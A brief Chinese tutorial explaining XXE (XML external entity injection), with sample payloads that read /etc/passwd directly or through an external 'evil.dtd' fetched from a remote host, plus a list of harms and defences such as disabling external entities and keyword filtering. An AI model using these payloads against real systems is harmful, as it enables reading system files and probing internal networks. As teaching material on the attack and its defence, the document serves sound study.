## XXE是什么？攻击方法？危害？防御方法？
#### XXE是什么？
先了解，外部实体声明:<!ENTITY 实体名称 SYSTEM "URI">，示例如下：
```
<?xml version="1.0"?>
<!DOCTYPE test [
	<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
	<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>
```
xxe也就是xml外部实体注入。
#### XXE攻击方法
a. 直接通过DTD外部实体声明
```
<?xml version="1.0"?>
<!DOCTYPE a [
	<!ENTITY b SYSTEM "file:///etc/passwd">
]>
<c>&b;</c>
```
b. 通过DTD文档引入外部DTD文档，再引入外部实体声明

XML内容：
```
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://mark4z5.com/evil.dtd">
<c>&b;</c>
```
DTD文件内容：
```
<!ENTITY b SYSTEM "file:///etc/passwd">
```
c. 通过DTD外部实体声明引入外部实体声明

XML内容：
```
<?xml version="1.0"?>
<!DOCTYPE a [
	<!ENTITY % d SYSTEM "http://mark4z5.com/evil.dtd">
	%d;
]>
<c>&b;</c>
```
DTD文件内容：
```
<!ENTITY b SYSTEM "file:///etc/passwd">
```
#### XXE危害
```
a. 任意文件读取
b. 执行系统命令
c. 探测内网端口
d. 攻击内网
```
#### XXE防御方法
```
a. 禁用外部实体声明
b. 过滤关键词（<!DOCTYPE，<!ENTITY，SYSTEM等）
```

